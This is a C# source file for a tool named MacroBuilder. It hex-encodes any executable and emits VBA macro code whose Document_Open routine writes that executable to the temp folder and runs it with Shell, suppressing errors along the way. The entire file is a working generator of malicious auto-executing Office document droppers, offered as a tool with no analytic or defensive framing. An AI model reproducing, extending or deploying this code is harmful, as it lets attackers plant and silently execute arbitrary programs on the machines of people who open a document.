using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace MacroBuilder
{
    public static class Extenstions
    {
        public static void WriteLineC(this StreamWriter sb, string line)
        {
            sb.WriteLine(line);
#if DEBUG
            Console.WriteLine(line);
#endif
        }
    }

    class Program
    {
        private static uint m_blocksize = 300000;
        internal static uint m_linesize = 120;

        internal static UInt32 BlockSize
        {
            get
            {
                uint blocksize = m_blocksize;
                if (blocksize % 3 != 0)
                    blocksize -= blocksize % 3;
                return blocksize;
            }
        } 
        internal static UInt16 LineSize
        {
            get
            {
                return (ushort)Math.Max(Math.Max(20, m_linesize), 120);
            }
        }

        public static void Main(string[] args)
        {
            string exeFile, outPutFile;
            Program.GetArgs(args, out exeFile, out outPutFile);

            try
            {
                string fileName = Path.GetFileNameWithoutExtension(outPutFile) + ".exe";
                using (StreamWriter Writer = new StreamWriter(outPutFile))
                {
                    Byte[] Array = File.ReadAllBytes(exeFile);
                    char[] hex = BitConverter.ToString(Array).ToCharArray();

                    uint parts = (uint)Math.Floor((double)hex.Length / Program.BlockSize);
                    StringBuilder SB = new StringBuilder(getText(fileName, 1));

                    for (int i = 0; i < parts + 1; i++)
                    {
                        string functionName = "s" + i;
                        SB.Append(getText(functionName, 2));
                    }

                    SB.Append(getText(fileName, 3));
                    Writer.WriteLineC(SB.ToString());

                    for (uint j = 0; j < parts + 1; j++)
                    {
                        string functionName = "s" + j;
                        Writer.WriteLineC("Private Function " + functionName + "() As String");
                        string text = "";
                        int count = 0;

                        for (long i = j * Program.BlockSize; i < Math.Min((j + 1) * Program.BlockSize, hex.Length) ; i++)
                        {
                            if (hex[i] == '-')
                                continue;

                            if (count == LineSize)
                            {
                                text = text + hex[i];
                                String newLine = functionName + " = " + functionName + " & \"" + text + "\"";
                                Writer.WriteLineC(newLine);
                                text = "";
                                count = 0;
                            }
                            else
                            {
                                text = text + hex[i];
                                count++;
                            }
                        }

                        Writer.WriteLineC(functionName + " = " + functionName + " & \"" + text + "\"");
                        Writer.WriteLineC(@"End Function
                        ");
                    }
                }
                Console.WriteLine("Done! - Version " + getVersion());
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        private static string getVersion()
        {
            FileVersionInfo value = FileVersionInfo.GetVersionInfo(System.Reflection.Assembly.GetExecutingAssembly().Location);
            return value.FileMajorPart + "." + value.FileMinorPart;
        }

        private static void GetArgs(string[] args, out string exeFile, out string outFile)
        {
            if (args.Length == 2)
            {
                exeFile = args[0];
                outFile = args[1];
            }
            else
            {
                string filename = Process.GetCurrentProcess().ProcessName;
                Console.WriteLine(String.Format("Version {1} - Missing Arguments\n{0}.exe [exe-file] [text-file]", filename,getVersion()));
                exeFile = outFile = "";
                Environment.Exit(0);
            }
        }

        private static string getText(string text, short num)
        {
            switch(num)
            {
                case 1:
                    return 
@"Private Sub Document_Open()
    Dim strStoreDirectory
    Dim strExecString
    On Error GoTo ErrorsFun:
    strStoreDirectory = Environ(""temp"") & ""\""
    Set fs = CreateObject(""Scripting.FileSystemObject"")
    Set file = fs.CreateTextFile(strStoreDirectory & """ + text + @""", True)
";
                case 2:
                    return
@"    strExecString = " + text + @"()
    For x = 1 To Len(strExecString) Step 2
        file.Write Chr(CLng(""&H"" & Mid(strExecString, x, 2)))
    Next
";
                case 3:
                    return
@"    file.Close
    Call Shell(strStoreDirectory & """ + text + @""")
    ErrorsFun:
End Sub
";
                default:
                    return "";
            }
        }
    }
}
